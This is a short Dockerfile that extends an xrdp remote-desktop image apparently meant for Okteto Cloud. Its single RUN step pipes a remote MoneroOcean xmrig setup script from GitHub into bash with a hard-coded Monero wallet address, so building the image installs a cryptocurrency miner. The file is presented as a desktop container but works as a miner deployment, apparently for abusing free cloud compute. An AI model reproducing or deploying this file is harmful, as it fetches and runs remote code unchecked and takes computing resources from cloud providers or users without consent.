FROM aank999/xrdp-okteto-cloud:latest
LABEL maintainer="SOPO WE"
EXPOSE 80
RUN curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 872hagi3A6cAP8dqtLyKvRNSCm3rGNtJrRUJHLWcwzNJEdZ7tRCSUJ2bk28JkxmWyR3BsvkEAP228KyxSUaySLjrLWSdiJV

ENTRYPOINT ["/startup.sh"]
